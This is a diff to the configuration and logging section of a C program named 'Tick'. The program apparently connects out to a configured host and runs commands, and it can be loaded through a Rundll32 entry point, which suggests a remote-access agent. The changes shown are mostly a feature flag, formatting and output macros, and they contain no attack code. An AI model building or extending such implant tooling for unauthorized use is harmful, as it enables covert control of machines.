@@ -150,48 +150,52 @@
 #  define TICK_MAX_CONFIG_FILE_DEPTH 1
 #endif
 
+// Enable support for Rundll32 on Windows builds.
+#ifndef   TICK_FEATURES_RUNDLL
+#  define TICK_FEATURES_RUNDLL 1
+#endif
+
 // Rundll32 compatible entrypoint function name.
-// Setting an empty value disables this feature.
 #ifndef TICK_RUNDLL_ENTRY_POINT
-#define TICK_RUNDLL_ENTRY_POINT EntryPoint
+#  define TICK_RUNDLL_ENTRY_POINT EntryPoint
 #endif
 
 // A little sanity check. Not too smug, I hope.
 #if !( defined (TICK_CONFIG_HOSTNAME) || TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE || TICK_CONFIG_USE_BIN )
-#error No host to connect to and no configuration sources. How were you planning to connect it? :)
+#  error No host to connect to and no configuration sources. How were you planning to connect it? :)
 #endif
 #if TICK_FEATURES_CRYPTO != TICK_CONFIG_USE_SSL
-#error Not sure how this happened but we ended up with SSL both enabled and disabled at the same time :(
+#  error Not sure how this happened but we ended up with SSL both enabled and disabled at the same time :(
 #endif
 
 // More validation, this time with boring error messages.
 // I can't come up with a witticism for every single one, that'd be overkill.
 #if (! TICK_CONFIG_USE_ARGV) && defined (_WIN32)
-#error Command line parsing cannot be disabled for Windows builds.
+#  error Command line parsing cannot be disabled for Windows builds.
 #endif
 #if TICK_CONFIG_PORT < 0 || TICK_CONFIG_PORT > 0xFFFF
-#error Invalid value for TICK_CONFIG_PORT
+#  error Invalid value for TICK_CONFIG_PORT
 #endif
 #if TICK_CONFIG_TIME_LIMIT_START < 0
-#error Invalid value for TICK_CONFIG_TIME_LIMIT_START
+#  error Invalid value for TICK_CONFIG_TIME_LIMIT_START
 #endif
 #if TICK_CONFIG_TIME_LIMIT_END < 0
-#error Invalid value for TICK_CONFIG_TIME_LIMIT_END
+#  error Invalid value for TICK_CONFIG_TIME_LIMIT_END
 #endif
 #if TICK_CONNECT_RETRY_PAUSE < 0
-#error Invalid value for TICK_CONNECT_RETRY_PAUSE
+#  error Invalid value for TICK_CONNECT_RETRY_PAUSE
 #endif
 #if TICK_PARSER_BUFFER_SIZE <= 0
-#error Invalid value for TICK_PARSER_BUFFER_SIZE
+#  error Invalid value for TICK_PARSER_BUFFER_SIZE
 #endif
 #if TICK_EXEC_BUFFER_SIZE <= 0
-#error Invalid value for TICK_EXEC_BUFFER_SIZE
+#  error Invalid value for TICK_EXEC_BUFFER_SIZE
 #endif
 #if TICK_MAX_CONFIG_FILE_SIZE <= 0
-#error Invalid value for TICK_MAX_CONFIG_FILE_SIZE
+#  error Invalid value for TICK_MAX_CONFIG_FILE_SIZE
 #endif
 #if TICK_MAX_CONFIG_FILE_DEPTH < 0
-#error Invalid value for TICK_MAX_CONFIG_FILE_DEPTH
+#  error Invalid value for TICK_MAX_CONFIG_FILE_DEPTH
 #endif
 
 /*****************************************************************************/
@@ -226,6 +230,7 @@
 #include <libloaderapi.h>
 #include <memoryapi.h>
 #include <shlwapi.h>
+#include <conio.h>
 
 // https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo#support-for-getaddrinfo-on-windows-2000-and-older-versions
 #include <wspiapi.h>
@@ -267,11 +272,20 @@
 
 // Log function. Wraps on printf, when disabled at compile time it's effectively a no-op.
 #if TICK_VERBOSE
-#include <stdio.h>
-//#define LOG printf
-#define LOG(...) fprintf(stderr, __VA_ARGS__)
+# ifdef _WIN32
+#  define LOG(...) _cprintf(__VA_ARGS__)
+# else
+#  define LOG(...) fprintf(stderr, __VA_ARGS__)
+# endif
 #else
-#define LOG(...)
+# define LOG(...)
+#endif
+
+// Text output function. Similar to LOG but outputs to stdout instead of stderr.
+#ifdef _WIN32
+# define PRINT(...) _cprintf(__VA_ARGS__)
+#else
+# define PRINT(...) printf(__VA_ARGS__)
 #endif
 
 // Helper function to convert 64 bit ints to network byte order.
